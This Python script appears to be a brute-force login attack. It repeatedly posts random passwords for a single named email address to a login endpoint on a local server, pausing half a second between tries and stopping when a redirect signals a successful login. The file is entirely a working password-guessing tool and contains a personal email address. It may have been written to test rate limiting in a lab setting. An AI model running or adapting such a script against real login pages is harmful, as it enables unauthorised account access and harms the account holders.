import sys
import requests
import time
import random
import string

BASE_URL = "http://127.0.0.1:5002"
EMAIL = "abhiramkm2003@gmail.com"

def random_password(length=12):
    return "".join(random.choices(string.ascii_letters + string.digits, k=length))

count = 0
while True:
    count += 1
    password = random_password()
    try:
        resp = requests.post(
            f"{BASE_URL}/login",
            data={"email": EMAIL, "password": password},
            allow_redirects=False,
            timeout=5
        )
        status = resp.status_code
        msg = f"[{count}] Failed (status {status})"
        print(msg, flush=True)
        if status == 302:
            print(f"[{count}] SUCCESS — password found: {password}", flush=True)
            break
    except requests.exceptions.ConnectionError:
        print(f"[{count}] Connection refused", flush=True)
        break
    except Exception as e:
        print(f"[{count}] Error: {e}", flush=True)

    time.sleep(0.5)
